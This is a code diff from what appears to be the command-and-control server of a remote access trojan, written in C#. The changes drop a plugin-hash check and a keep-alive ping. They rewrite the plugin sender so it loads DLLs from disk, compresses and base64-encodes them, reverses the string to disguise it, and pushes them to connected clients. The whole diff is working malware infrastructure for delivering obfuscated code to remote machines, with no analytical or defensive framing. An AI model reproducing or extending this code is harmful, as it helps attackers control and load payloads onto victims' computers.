@@ -204,41 +204,18 @@ namespace Server.Connection
             }
         }
 
-        public void CheckPlugin() // send all plugins md5 hash to client
-        {
-            try
-            {
-                List<string> plugins = new List<string>();
-                foreach (var plugin in Settings.Plugins)
-                {
-                    plugins.Add(plugin.Key);
-                }
-                if (plugins.Count > 0)
-                {
-                    MsgPack msgPack = new MsgPack();
-                    msgPack.ForcePathObject("Packet").SetAsString("checkPlugin");
-                    msgPack.ForcePathObject("Hash").SetAsString(string.Join(",", plugins));
-                    ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
-                }
-            }
-            catch (Exception ex)
-            {
-                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
-            }
-        }
-
         public void SendPlugin(string hash) // client is missing some plguins, sending them // total plugins = 550kb
         {
             try
             {
-                foreach (var plugin in Settings.Plugins)
+                foreach (string plugin in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                 {
-                    if (hash == plugin.Key)
+                    if (hash == GetHash.GetChecksum(plugin))
                     {
                         MsgPack msgPack = new MsgPack();
                         msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
-                        msgPack.ForcePathObject("Dll").SetAsString(plugin.Value);
-                        msgPack.ForcePathObject("Hash").SetAsString(plugin.Key);
+                        msgPack.ForcePathObject("Dll").SetAsString(Strings.StrReverse(Convert.ToBase64String(Zip.Compress(File.ReadAllBytes(plugin)))));
+                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                         ThreadPool.QueueUserWorkItem(Send,msgPack.Encode2Bytes());
                         break;
                     }
@@ -247,28 +224,6 @@ namespace Server.Connection
             catch (Exception ex)
             {
                 new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
-            }
-        }
-
-        public void KeepAlivePacket(object o)
-        {
-            lock (SendSync)
-            {
-                try
-                {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "Ping";
-                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
-                    byte[] buffer = msgpack.Encode2Bytes();
-                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
-                    SslClient.Write(buffersize, 0, buffersize.Length);
-                    SslClient.Write(buffer, 0, buffer.Length);
-                    SslClient.Flush();
-                }
-                catch
-                {
-                    Disconnected();
-                }
             }
         }
     }
